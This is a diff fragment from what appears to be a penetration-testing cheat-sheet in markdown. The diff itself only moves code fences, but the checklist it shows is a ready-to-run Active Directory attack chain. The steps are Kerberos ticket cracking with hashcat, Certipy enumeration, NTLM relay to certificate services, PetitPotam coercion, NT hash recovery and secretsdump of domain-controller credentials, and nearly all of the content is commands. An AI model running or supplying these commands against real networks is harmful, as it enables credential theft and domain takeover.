@@ -207,7 +207,7 @@ for i in $(find -name '*.txt'); do hashcat -m 13100 --force tgt_ticket.txt "$i";
 ```
 
 **Petitpotam**
-```
+
 - [] Certipy find –u user@trust.localhost -p 'pass' –bloodhound –dc-ip 172.16.126.128
 - [] impacket-ntlmrelayx -smb2support -t https://CA-01/certsrv/certfnsh.asp --adcs --template DomainController* (результат Certipy && в отдельном окне)
 - [] python3 petitpotam.py –u user@trust.localhost –p 'pass' –d 'trust.localhost' ntlmrelay_ip* dc_ip* 
@@ -216,7 +216,7 @@ for i in $(find -name '*.txt'); do hashcat -m 13100 --force tgt_ticket.txt "$i";
 - [] export KRB5CCNAME=host.ccache
 - [] python3 getnthash.py domain.local/dc\$ -key as-rep-key*
 - [] python3 secretsdump.py –hashes ':nt-hash' 'trust.localhost/dc:$@dc-ip' –just-dc-user user*
-
+```
 ```
 
 **FTP**
